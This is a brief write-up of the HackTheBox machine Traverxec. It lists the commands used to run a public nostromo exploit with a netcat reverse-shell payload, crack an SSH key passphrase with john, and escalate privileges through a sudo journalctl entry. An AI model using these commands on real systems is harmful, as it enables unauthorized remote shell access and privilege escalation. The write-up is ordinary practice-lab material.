---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/Ti3kZvfLni8/0.jpg
layout: post
media_subpath: /assets/posts/2020-04-11-traverxec-hackthebox
tags:
- hackthebox
- journalctl
- linux
- nostromo
- sudo
title: Traverxec @ HackTheBox
---

Traverxec is a 20-point machine on hackthebox that involves using a public exploit on the nostromo webserver, cracking the passphrase of an ssh private key and abusing a sudo entry for journalctl.

{% youtube Ti3kZvfLni8 %}

## Notes

Nostromo exploit:

```
searchsploit nostromo
searchsploit -m exploits/multiple/remote/47837.py
python 47837.py traverxec.htb 80 "nc <ip> 7000 -e /bin/sh"
```

Cracking the private key:

```
ssh2john.py ./david.key | tee david.hash
john -w=rockyou.txt david.hash
```

Exploiting journalctl:

```
stty rows 2
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```